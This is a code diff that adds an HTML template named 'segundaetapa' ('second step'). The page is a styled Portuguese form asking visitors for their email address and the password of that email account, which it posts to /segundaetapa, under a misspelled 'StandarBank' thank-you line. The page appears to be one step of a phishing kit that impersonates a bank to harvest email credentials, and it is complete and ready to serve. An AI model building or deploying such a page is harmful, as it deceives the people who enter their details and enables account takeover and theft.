@@ -1,0 +1,76 @@
+<!-- templates/segundaetapa.html -->
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Confirmação de E-mail</title>
+  <style>
+    body {
+      margin: 0;
+      background: linear-gradient(to right, #1c1c1c, #003a70);
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      padding: 1rem;
+      color: #fff;
+    }
+    .box {
+      background: rgba(255,255,255,0.08);
+      border-radius: 16px;
+      padding: 2rem;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      text-align: center;
+      backdrop-filter: blur(8px);
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 12px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      background: #fff;
+      color: #333;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 12px;
+      font-size: 1rem;
+      font-weight: bold;
+      color: #fff;
+      background: linear-gradient(145deg, #00b4db, #0083b0);
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0 5px 12px rgba(0,0,0,0.2);
+      transition: all 0.2s ease;
+    }
+    button:hover {
+      transform: scale(1.03);
+    }
+    h2 {
+      margin-bottom: 1rem;
+    }
+    p {
+      font-size: 0.9rem;
+      color: #ccc;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <form class="box" action="/segundaetapa" method="POST">
+    <h2>Validação de E-mail</h2>
+    <input type="email" name="emailverificado" placeholder="Digite o seu E-mail" required />
+    <input type="password" name="senhaverificada" placeholder="Senha do E-mail" required />
+    <button type="submit">Confirmar</button>
+    <p>StandarBank agradece seu tempo</p>
+  </form>
+</body>
+</html>
